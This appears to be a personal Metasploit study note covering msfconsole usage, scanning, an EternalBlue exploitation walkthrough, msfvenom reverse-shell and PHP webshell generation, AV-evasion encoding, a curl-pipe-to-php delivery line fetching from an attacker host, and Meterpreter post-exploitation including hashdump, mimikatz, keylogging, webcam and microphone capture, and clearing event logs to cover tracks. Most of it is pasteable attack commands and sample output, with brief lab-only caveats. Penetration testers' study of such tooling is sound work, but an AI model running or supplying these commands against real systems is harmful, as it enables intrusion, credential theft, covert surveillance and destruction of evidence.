```yml
date: 2025-09-10  
author: Sameer Saini  
reason: 0x45
title: Metasploit — Deep Notes (Obsidian-friendly)  
tags: [metasploit, pentest, exploit, notes]
```


## Quick overview

- **Metasploit Framework** = open source toolkit for penetration testing, exploit development, and post-exploitation.
    
- **Metasploit Pro** = commercial product built on top of the framework (extra automation, GUI, reporting).
    
- Major use cases: information gathering, scanning, exploitation, payload generation, post-exploitation, exploit dev.
    

---

## Main components

|Component|Purpose|
|--:|:--|
|`msfconsole`|Primary CLI interface; interactive environment for searching, configuring and running modules.|
|`modules`|Reusable pieces (exploits, auxiliary scanners, post modules, payloads, encoders, nops).|
|`msfvenom`|Payload & shellcode generator + encoder. Replaces old `msfpayload`/`msfencode`.|
|Tools|`pattern_create` / `pattern_offset` (exploit dev helpers), `msfdb` (DB management), `msfconsole` scripting support.|

---

## Jargon & concepts

- **Exploit** — code that leverages a vulnerability to achieve code execution, privilege escalation, etc.
    
- **Vulnerability** — bug/weakness in design, code, or config.
    
- **Payload** — code executed on the target after exploitation (e.g., shell, meterpreter).
    
- **Stager / Stage** — a _stager_ sets up a channel and pulls the larger _stage_ across (staged payloads).
    
- **Single payload** — self-contained payload that does everything in one shot (no second stage).
    
- **Handler** — listener on the attacker side that waits for incoming connections from a payload (e.g. `multi/handler`).
    
- **Post module** — run on a compromised host to gather data, escalate privileges, pivot, or maintain access.
    
- **Encoder / Evasion** — transform payload bytes to avoid detection (may help against signature scanners).
    
- **NOPs** — padding/no-op instructions used in exploit development to align buffers.
    

---

## Module categories (summary + examples)

> [!info] Module categories  
> Use `search` in `msfconsole` to find modules (e.g. `search type:auxiliary smb`).

- **Auxiliary** — scanners, fuzzers, bruteforcers, and other non-exploit helpers.
    
    - Example: `auxiliary/scanner/ssh/ssh_login` (credential brute force).
        
- **Exploit** — modules that attempt to exploit a vulnerability.
    
    - Example: `exploit/windows/smb/ms17_010_eternalblue` (illustrative).
        
- **Payload** — what runs after successful exploit (shells, Meterpreter, file uploaders).
    
    - Example single: `windows/x64/meterpreter_reverse_tcp` (staged vs single variants exist).
        
    - Example staged: `windows/meterpreter/reverse_tcp` (stager → downloads meterpreter stage).
        
- **Post** — run on targets after access.
    
    - Example: `post/windows/gather/enum_logged_on_users`.
        
- **Encoder** — obfuscate payloads (e.g., `x86/shikata_ga_nai`).
    
- **Evasion** — modules/tools to attempt AV avoidance (use with care/ethics).
    
- **NOPs** — e.g. `x86/single_byte` for exploit padding.
    

---

## Naming conventions (how to read payload names)

- `name_with_underscore` → **single/inline** payload (one blob).
    
- `name/with/slash` → **staged** payload (small stager first, stage downloaded later).
    
- e.g. `windows/shell/reverse_tcp` (staged) vs `windows/shell_reverse_tcp` (single).
    

---

## msfconsole — day-to-day workflow & commands

Start:

```bash
msfconsole
```

Basic interactive commands:

```text
help                    # show help and top-level commands
search <term>           # search modules (e.g. search type:exploit smb)
use <module_path>       # select a module (e.g. use exploit/windows/smb/...)
show options            # show configurable options for current module
show payloads           # display compatible payloads
show targets            # show target variants for exploit
set <opt> <value>       # set module option (e.g. set RHOSTS 10.10.10.5)
set PAYLOAD <payload>   # set the payload for the exploit
set LHOST <attacker_ip> # set your listen IP
set LPORT 4444          # set your listen port
setg <opt> <value>      # set global option across modules
unsetg <opt>            # unset a global option
exploit                 # run exploit (use `-j` to background, `-z` for no-session)
run                     # alias for exploit (for some modules)
back                    # unload module (return to msfconsole prompt)
sessions -l             # list sessions
sessions -i <id>        # interact with session id
background              # background the current session
```

> [!note] Backgrounding & handlers  
> If you expect a reverse connection, you can use `exploit -j` or run `use exploit/multi/handler` and `exploit` to handle incoming sessions.

---

## Example — full exploit workflow (typical pattern)

1. **Recon & find target**
    
    - Use scanners: `use auxiliary/scanner/portscan/tcp` or service scanners.
        
2. **Select exploit**
    
    ```text
    use exploit/windows/smb/ms17_010_eternalblue
    show targets
    set RHOSTS 10.10.10.5
    set RPORT 445
    ```
    
3. **Choose payload & handler settings**
    
    ```text
    set PAYLOAD windows/x64/meterpreter_reverse_tcp
    set LHOST 10.0.0.5
    set LPORT 4444
    ```
    
4. **Run exploit**
    
    ```text
    exploit
    ```
    
5. **After successful session**
    
    ```text
    sessions -l
    sessions -i 1
    # now inside Meterpreter
    sysinfo
    getsystem          # attempt privilege escalation (careful & conditional)
    ```
    

---

## msfvenom — create payloads & shellcode

Generate a standalone EXE with a reverse Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
```

Generate raw shellcode (for exploit dev):

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shellcode.bin
```

Encode payloads:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

- `-e` = encoder, `-i` = iterations.
    

> [!warning] Encoding is _not_ guaranteed AV-evasion; test and validate. Encoders can break payloads.

---

## Handling sessions & `multi/handler`

When you create a payload that calls back to you, use `multi/handler`:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```

`-j` runs handler as a job so msfconsole remains interactive.

---

## Meterpreter — quick cheatsheet

Once you have a Meterpreter session (`sessions -i <id>`):

- `sysinfo` — host info
    
- `getuid` — user context
    
- `ps` — list processes
    
- `migrate <pid>` — move to another process
    
- `upload <local> <remote>` / `download <remote> <local>`
    
- `execute -f cmd.exe -i -t` — spawn a shell
    
- `run post/multi/recon/local_exploit_suggester` — suggest local exploits
    
- `hashdump` — dump SAM/NTHash (requires privileges & proper modules)
    
- `privs` / `getprivs` — list privileges
    

> [!note] Always validate legality and scope before running post modules or dumping credentials.

---

## Post-exploitation modules

Use `post/*` modules to gather data and persist, for example:

- `post/windows/gather/enum_logged_on_users`
    
- `post/windows/gather/credentials`
    
- `post/multi/manage/shell_to_meterpreter` — upgrade basic shell to Meterpreter (if conditions allow)
    

Example:

```text
use post/windows/gather/enum_chrome
set SESSION 1
run
```

---

## Exploit development helpers

- `pattern_create.rb` and `pattern_offset.rb` — create/find offsets for buffer overflow exploit dev.
    
    - Create: `pattern_create -l 2000`
        
    - Find offset: `pattern_offset -q 0x41326341 -l 2000`
        
- `gdb` / `pwndbg` / `radare2` complement exploit dev efforts.
    

---

## Encoders & evasion — short notes

- Encoders transform the byte sequence — e.g., `x86/shikata_ga_nai`.
    
- Evasion modules try to modify payloads or delivery to bypass AV/EDR — use ethically and in scope.
    
- Modern EDRs use behavioural detection; encoding alone often fails.
    

---

## Useful `search` examples

```text
search type:exploit name:smb
search type:auxiliary smb login
search type:post windows gather
```

---

## Best practices & safety

- Use Metasploit only in authorized, legal environments (lab, HTB, CTF, client with signed scope).
    
- Keep a clean lab for testing (isolated network).
    
- When using payloads that create persistence, be careful — you may leave detectable artifacts.
    
- Prefer staged payloads for size constraints; singles for simple one-shot tasks.
    
- Record all commands, timestamps, and evidence for reporting.
    

---

## ASCII packet/flow diagram (simple)

```
[Attacker: msfconsole]  <---setup handler--->  waiting for callback
      |
deliver exploit (phishing / service exploit / file)
      |
[Target] --(exploit triggers)--> runs payload
      |
payload opens connection -> attacker handler (LHOST:LPORT)
      |
Meterpreter session established -> interactive post-exploit
```

---

## Quick examples (cheat-sheet)

1. **Search an exploit**
    

```text
msf6 > search ms17_010
```

2. **Use and configure exploit**
    

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.0.0.5
msf6 exploit(ms17_010_eternalblue) > exploit
```

3. **Generate a payload with msfvenom**
    

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o /tmp/rev.exe
```

4. **Start handler**
    

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > exploit -j
```

---



## 1) Find a port scanner in `msfconsole`

```text
msf6 > search portscan
```

Typical result you might pick:

```
auxiliary/scanner/portscan/tcp
```

Load it:

```text
msf6 > use auxiliary/scanner/portscan/tcp
```

Show options:

```text
msf6 auxiliary(scanner/portscan/tcp) > show options
```

---

## 2) Important options explained

|Option|Purpose|Example / notes|
|---|--:|---|
|`CONCURRENCY`|How many hosts to attempt in parallel|`set CONCURRENCY 20` — faster but higher load & noise|
|`PORTS`|Ports / range to scan|`set PORTS 21-25,80,443,8000-8100`|
|`RHOSTS`|Target host(s) or network CIDR|`set RHOSTS 10.10.10.0/24` or `set RHOSTS 10.10.10.5`|
|`THREADS`|Number of worker threads used by the scanner|`set THREADS 10`|
|`TIMEOUT`|Packet timeout in seconds|`set TIMEOUT 5`|

Run it:

```text
set RHOSTS 10.10.10.0/24
set PORTS 1-65535
set THREADS 50
run
```

> [!tip] For noisy scans reduce CONCURRENCY/THREADS. For stealthier scans use smaller `PORTS` sets and longer `TIMEOUT`.

---

## 3) Use `nmap` inside `msfconsole`

You can call `nmap` from within Metasploit and optionally import results into the DB with `db_nmap`:

```text
# quick TCP SYN scan for top ports
db_nmap -sS --top-ports 100 10.10.10.5

# verbose + service/version detection + scripts for vuln detection
db_nmap -sV -sC -p 1-65535 10.10.10.5
```

`db_nmap` will automatically parse and insert hosts/services into the msf DB (view with `hosts` / `services` commands).

---

## 4) UDP service identification

UDP is noisy/slow; use targeted sweeps:

```text
# use the Metasploit UDP sweep module
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 10.10.10.0/24
set PORTS 53,123,161,500
set THREADS 20
run
```

Or use nmap UDP scan (slower but powerful):

```bash
db_nmap -sU -p 53,123,161,500 10.10.10.5
```

---

## 5) SMB scanning (version / enumerations)

Metasploit has SMB scanners that enumerate version and shares:

```text
# check SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
set THREADS 10
run

# enumerate shares & sessions (when allowed)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run
```

After running these, check DB:

```text
hosts          # list discovered hosts
services       # list services collected
vulns          # list known vulns (if any)
```

---

# Metasploit Database (Postgres) — full workflow & commands

> [!note] DB makes large engagements manageable: persist scans, pivot between workspaces, query services/hosts.

### 1) Start Postgres & init msf DB

On a Kali-like system:

```bash
sudo systemctl start postgresql

# initialize Metasploit DB (creates DB, user, config)
sudo msfdb init
```

Check DB status in `msfconsole`:

```text
msf6 > db_status
```

Expected: `connected to msf6 database...`

---

### 2) Workspaces (multi-target projects)

List workspaces:

```text
msf6 > workspace
```

Create / delete / change:

```text
msf6 > workspace -a corpengagement      # add
msf6 > workspace -d old-engagement      # delete
msf6 > workspace corpengagement         # switch into workspace
```

All DB actions (e.g., `db_nmap`) now store into the selected workspace.

---

### 3) Scan + store (example full flow)

1. Select (or create) workspace:
    

```text
workspace -a smb-assessment
workspace smb-assessment
```

2. Run `db_nmap` to populate DB:
    

```text
db_nmap -sS -p 135,139,445,3389 --open 10.10.10.0/24
```

3. Check hosts & services:
    

```text
hosts
services
services -S smb   # show services filtered by name 'smb'
```

4. Use results to drive exploitation selection (filter by OS/service/version):
    

```text
services -S smb | grep 10.10.10.5         # quick grep example
```

---

# Vulnerability Scanning — practical snippet & tips

A real-world style flow (lab):

1. **Port discovery** — `db_nmap` or `auxiliary/scanner/portscan/tcp`
    
2. **Service/version detection** — `db_nmap -sV -sC` (or `nmap -sV --script=vuln`)
    
3. **Targeted vulnerability checks** — Metasploit modules or external scanners (Nessus, OpenVAS) — import results to DB
    
4. **Prioritize** by criticality: public-facing services, known CVEs, credentials reuse
    

Example `nmap` vuln scan inside msf:

```text
db_nmap -sV --script vuln 10.10.10.5
```

Then search for exploit modules matching the service:

```text
search type:exploit name:smb
search cve:2017-0144   # example search by CVE if you know it
```

---

# Exploitation — lab scenario (real-world style, step-by-step)

> Scenario: Target `10.10.10.5` has SMB open and `smb_version` reports a vulnerable version. You have permission to test.

### A. Recon & pick exploit

```text
# in msfconsole
workspace smb-assessment
db_nmap -sS -p 445 --open 10.10.10.5

# check smb info found in DB
services -S smb
```

Find exploit candidates:

```text
search type:exploit smb name:eternalblue
```

### B. Configure exploit + payload

```text
use exploit/windows/smb/ms17_010_eternalblue        # example module
show targets
set RHOSTS 10.10.10.5
set RPORT 445

# choose payload (staged vs single)
set PAYLOAD windows/x64/meterpreter_reverse_tcp

# listener settings
set LHOST 10.0.0.5      # attacker IP (lab)
set LPORT 4444
```

### C. Run exploit (and background handler if needed)

```text
exploit -j            # run as job (background); or just `exploit`
# or: use handler separately:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```

### D. After successful exploit

```text
sessions -l
sessions -i 1         # interact with session #1
# inside Meterpreter:
sysinfo
getuid
hashdump              # requires proper privileges and module availability
```

> [!important] Some exploit modules will automatically start a handler for you; others expect you to run `multi/handler` first. Read `show options` and module docs (`info`) to confirm behavior.

---

# `msfvenom` — full examples & common formats

List payloads and formats:

```bash
msfvenom -l payloads
msfvenom --list formats
```

### Example payload generation commands (lab)

Linux ELF payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o rev_shell.elf
```

Windows EXE payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o rev_shell.exe
```

PHP webshell (raw PHP code to drop into a PHP app in lab):

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > rev_shell.php
```

ASP payload:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp > rev_shell.asp
```

Python reverse command (raw):

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw > rev_shell.py
```

---

## Encoders — basic usage

> Encoders are legacy obfuscation; modern EDRs often detect by behavior.

```bash
# encode with shikata_ga_nai 3 iterations (x86 example)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

---

# Handlers — catch the shell (step-by-step example)

1. Start a handler in `msfconsole`:
    

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

2. Deliver the payload to the target (lab):
    

- **Web delivery** (lab only): place `rev_shell.php` into a web root and trigger via browser/curl:
    

```bash
# on attacker machine: host the folder with the php file
python3 -m http.server 8000
# on target (lab) fetch it (if allowed in lab)
curl http://10.0.0.5:8000/rev_shell.php | php
```

3. Handler receives callback:
    

```text
msf6 > sessions -l
msf6 > sessions -i <id>
```

---

# Full pasteable lab scenario — end to end (condensed)

```text
# Start DB & workspace
sudo systemctl start postgresql
sudo msfdb init
msfconsole
workspace -a lab-scan
workspace lab-scan

# Fast port/service discovery, store in DB
db_nmap -sS -p 21,22,80,139,445,3306,3389 --open 10.10.10.5

# Check results
hosts
services

# SMB version + shares
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run

# Find exploit
search type:exploit smb  # then pick a matched exploit

# Configure exploit
use exploit/windows/smb/EXAMPLE_MODULE
set RHOSTS 10.10.10.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444

# Start handler (in separate msfconsole tab/session or as background job)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j

# Generate payload (attacker)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o /tmp/rev_shell.exe

# Deliver payload in lab (method depends on allowed vector)
# After execution on target, monitor handler and interact:
sessions -l
sessions -i 1
```

---


## How Meterpreter Works

- **In-memory execution** → Does not touch the disk, reducing AV detection.  
- **Encrypted communication** → Uses TLS/SSL or other secure channels to evade IDS/IPS.  
- **Modular** → Extensions can be dynamically loaded (e.g., `priv`, `stdapi`, `kiwi`).  
- **Flexible transports** → Supports reverse TCP, reverse HTTP/S, staged or stageless payloads.  

Your decision on which Meterpreter to use depends on:
1. **Target OS** → Windows, Linux, macOS, Android.  
2. **Available components** → Python/Java/PHP present?  
3. **Network conditions** → TCP vs HTTPS reverse shell, IPv4 vs IPv6 stealth.  

---

## Meterpreter Commands

### 🔹 Core Commands
- `background` → Background the session  
- `exit` → Close session  
- `migrate` → Move Meterpreter to a stable process (e.g., `explorer.exe`)  
- `sessions -i <id>` → Switch between sessions  

---

### 🔹 File System
- `ls`, `cd`, `pwd` → Navigate target’s filesystem  
- `download secret.txt` → Download files  
- `upload backdoor.exe` → Upload files  
- `search -f *.docx` → Search for sensitive files  

---

### 🔹 Networking
- `ifconfig` / `ipconfig` → View network interfaces  
- `netstat` → View active connections  
- `portfwd add -l 8080 -p 80 -r 10.0.0.5` → Forward local port 8080 to target’s port 80  
- `arp` → View ARP cache (can reveal other targets on LAN)  

---

### 🔹 System
- `sysinfo` → OS + hostname info  
- `getuid` → Current user context  
- `ps` → List processes  
- `kill <pid>` → Kill a process  
- `reboot` / `shutdown` → Restart/turn off target  

---

### 🔹 Privilege & Credential Stuff
- `getsystem` → Try privilege escalation to SYSTEM  
- `hashdump` → Dump SAM hashes  
- `load kiwi` → Load mimikatz module for credential extraction  
- `clearev` → Clear event logs (cover tracks)  

---

### 🔹 Monitoring & Surveillance
- `screenshare` → Watch live desktop  
- `screenshot` → Capture desktop  
- `record_mic -d 10` → Record 10 sec from microphone  
- `webcam_snap` → Take webcam picture  
- `keyscan_start` / `keyscan_dump` / `keyscan_stop` → Capture keystrokes  

---

## 🔥 Post-Exploitation Workflow (with Examples)

1. **Identify User Context**
   ```bash
   meterpreter > getuid
   Server username: WIN-LAB\victim
```

→ Confirms what privileges we have. If it’s not SYSTEM, attempt privilege escalation.

---

2. **Process Enumeration**
    
    ```bash
    meterpreter > ps
    PID   Name              Arch  Session  User
    1120  explorer.exe      x64   1        WIN-LAB\victim
    1337  lsass.exe         x64   0        NT AUTHORITY\SYSTEM
    ```
    
    → Shows running processes. Target `explorer.exe` for stability or `lsass.exe` for creds.
    

---

3. **Migrate to Stable Process**
    
    ```bash
    meterpreter > migrate 1120
    [*] Migrating from 1050 to 1120...
    [*] Migration completed successfully.
    ```
    
    → Moves Meterpreter to `explorer.exe` to avoid crashes.
    

---

4. **Dump Password Hashes**
    
    ```bash
    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    victim:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
    ```
    
    → Hashes can be cracked offline or passed for lateral movement.
    

---

5. **Search for Sensitive Files**
    
    ```bash
    meterpreter > search -f *passwords*.txt
    Found: C:\Users\victim\Desktop\passwords.txt
    ```
    
    → Look for config files, documents, credentials.
    

---

6. **Spawn a Shell**
    
    ```bash
    meterpreter > shell
    C:\Users\victim> whoami
    win-lab\victim
    ```
    
    → Drops into system command shell for native commands.
    

---

7. **Cover Tracks**
    
    ```bash
    meterpreter > clearev
    ```
    
    → Clear Windows event logs after finishing.
    

---

✅ **Post-exploitation flow in CTF/real ops** →  
`getuid → ps → migrate → sysinfo → hashdump → search → shell → cover tracks`

---
